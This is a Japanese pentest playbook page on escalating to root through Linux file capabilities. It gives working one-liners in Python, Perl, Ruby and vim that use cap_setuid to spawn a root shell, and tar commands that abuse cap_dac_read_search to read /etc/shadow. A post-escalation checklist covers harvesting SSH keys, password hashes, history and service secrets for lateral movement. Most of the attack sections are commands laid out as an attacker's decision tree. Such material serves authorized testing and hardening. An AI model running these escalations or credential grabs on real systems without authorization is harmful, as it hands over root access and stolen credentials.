# Linux Capabilities による権限昇格

> **スコープ**: Linux Capabilities（root 権限の細分化機構）が付与されたバイナリの検出と悪用。`cap_setuid` 経由の root シェル取得と `cap_dac_read_search` 経由のファイル読取まで扱う。昇格後の横展開確認は「昇格成功後に確認すること」セクションへ。

## 着火条件

`getcap -r / 2>/dev/null` の出力に、スクリプト言語（python / perl / ruby 等）または標準コマンドへの Capability 付与が見つかった場合。

## 環境前提
- 実行環境: ターゲット（シェル取得済みの状態で実行）
- 必要なツール: `getcap`（ペネトレ用 Linux ディストリ標準搭載。ターゲットにない場合は代替手段を §1 参照）
- 外部リソース依存: GTFOBins（https://gtfobins.github.io/）の "Capabilities" フィルター

## 先に確認すること

**なぜ SUID より先に Capabilities を確認するか:** SUID は `ls -la` で気づきやすいが、Capabilities は `getcap` 専用コマンドでしか見えないため管理者側でも見落とされていることが多い。既存バイナリへの付与なので怪しまれにくい。

**Capabilities の意味と危険度:**

| Capability | 権限の内容 | 危険度 |
|-----------|-----------|------|
| `cap_setuid` | 任意の UID に変更可能 | **最高**（即 root 昇格）|
| `cap_setgid` | 任意の GID に変更可能 | 高 |
| `cap_dac_override` | ファイルパーミッションを無視して読み書き | 高 |
| `cap_dac_read_search` | パーミッション無視の読み取り・ディレクトリ検索 | 高 |
| `cap_sys_admin` | 非常に広範な特権操作（ほぼ root 相当）| 高 |
| `cap_net_bind_service` | 1024 以下ポートへのバインド | 低（直接昇格に使えない）|
| `cap_net_raw` | RAW ソケット・パケットキャプチャ | 中 |
| `cap_sys_ptrace` | プロセスへの ptrace アタッチ | 中（GDB 経由で RCE の可能性）|

**攻撃者の思考トレース:** `cap_setuid` が付いたスクリプト言語バイナリは「非特権ユーザーとして実行して `setuid(0)` を呼ぶだけ」で root になれる最短経路。cap_dac_read_search はシェルを取れなくても `/etc/shadow` を読める経路になる。

---

## 1. Capabilities の検出

**コマンド:**

```bash
# [Target] 全ファイルシステムを走査
getcap -r / 2>/dev/null

# [Target] getcap が入っていない環境 — XATTR を直接読む
getfattr -n security.capability -R / 2>/dev/null

# [Target] /proc/[PID]/status から現在のプロセス Capability を確認（hex ビットマスク）
cat /proc/$$/status | grep -i cap
capsh --decode=[HEX]   # 16 進ビットマスクをデコード
```

**観測される出力 → 次のアクション:**

| `getcap` の出力 | 示唆 | 次のアクション |
|---|---|---|
| `python* = cap_setuid+eip` / 同系列 | スクリプト言語で UID 0 に切替可能 | §2 Python 悪用へ |
| `perl = cap_setuid+eip` | 同上（Perl）| §3 Perl 悪用へ |
| `ruby = cap_setuid+eip` | 同上（Ruby）| §4 Ruby 悪用へ |
| `vim.basic = cap_setuid+eip` | vim から root になれる | `:py3 import os; os.setuid(0); os.execl('/bin/bash','bash')` |
| `tar = cap_dac_read_search+eip` | パーミッション無視で読み取り | §5 tar 悪用へ |
| `cap_sys_admin` 付き任意バイナリ | ほぼ root 相当 | GTFOBins の "Capabilities" フィルターで悪用経路を検索 |
| `cap_net_bind_service` のみ | 直接昇格に使えない | 他の Capability / SUID / sudo を探す |

**注意:** フラグが `+ep` / `+eip` / `+p` で異なる（Effective / Inheritable / Permitted の組み合わせ）。`+e` が付いていれば基本的に悪用可。シンボリックリンクに対しては Capabilities が効かない（`readlink -f` で実体を確認）。スクリプトラッパー（`/usr/bin/python` → `/usr/bin/python3.8` へのシンボリックリンク等）の場合、`getcap` は実体側にしか反応しないので両方確認する。

---

## 2. Python で cap_setuid を悪用

**コマンド:**

```bash
# [Target] UID を 0(root) に変更してシェルを起動
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

# [Target] 確認用（シェルを起動せずコマンドだけ実行）
python3 -c "import os; os.setuid(0); os.system('id')"
python3 -c "import os; os.setuid(0); os.system('cat /etc/shadow | head -1')"
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `uid=0(root)` が返る | root 昇格成功 | 「昇格成功後に確認すること」セクションへ |
| `Operation not permitted` | Capability が実際には有効でない | `+e` フラグが付いているか再確認。非特権ユーザーとして実行しているか確認 |

**注意:** `cap_setuid` が付いたバイナリを `sudo` 経由や SUID 経由で実行した場合、挙動が異なる（既に EUID=0 なので効果なし）。必ず非特権ユーザーとして直接実行する。

---

## 3. Perl で cap_setuid を悪用

**コマンド:**

```bash
# [Target]
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `bash-5.x#` 等の root プロンプト | root 昇格成功 | 「昇格成功後に確認すること」セクションへ |

---

## 4. Ruby で cap_setuid を悪用

**コマンド:**

```bash
# [Target]
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| root プロンプト | root 昇格成功 | 「昇格成功後に確認すること」セクションへ |

---

## 5. tar で cap_dac_read_search を悪用

**コマンド:**

```bash
# [Target] パーミッションに関わらず任意ファイルを読める
tar -cvf /tmp/shadow.tar /etc/shadow
tar -xvf /tmp/shadow.tar -C /tmp/
cat /tmp/etc/shadow
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `/etc/shadow` の内容が読める | cap_dac_read_search 悪用成立 | ハッシュをクラック → `../05_Tools_Reference/Hashcat.md` |

**注意:** `cap_dac_read_search` 経由で `/etc/shadow` を取得した段階でも、ハッシュをクラックすれば横展開に使える。root シェルを取れなくても価値がある経路。

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| `getcap -r /` で何も出ない | Capabilities が付与されていない | `./SUID_SGID.md` / `./Sudo_Misconfig.md` へ |
| `getcap` コマンドがない | ターゲットに未インストール | `getfattr -n security.capability -R / 2>/dev/null` で代替 |
| `cap_setuid` はあるがシェル取得に失敗 | フラグが `+i` 単独など | `+e` フラグの有無を確認。GTFOBins で別の悪用方法を検索 |

---

## 昇格成功後に確認すること（横展開観点）

**「Capabilities 経由で root になれた = ゴール」ではない。**

- `/root/.ssh/` 配下の秘密鍵 → 他ホストへの SSH 接続性の確認
- `/etc/shadow` 全エントリのハッシュ → 他システムでのパスワード使い回し検証（`hashcat` で一括クラック）
- `/root/.bash_history` → 直近の接続先・コマンド履歴
- root の cron / systemd サービスへの認証情報埋め込み
- AD 連携設定（`/etc/sssd/sssd.conf` / `/etc/krb5.conf`）→ ドメイン側資格情報
- 内部サービス（DB・管理画面・API）の設定ファイル・環境変数 → 接続情報・シークレット

---

## 関連技術

- 前：`Enumeration_Checklist.md`（`getcap -r /` の実行）
- 後：SUID も確認 → `SUID_SGID.md`
- 後：`/etc/shadow` を読めるようになった → ハッシュクラック: `../05_Tools_Reference/Hashcat.md`
- GTFOBins: https://gtfobins.github.io/（"Capabilities" フィルター）
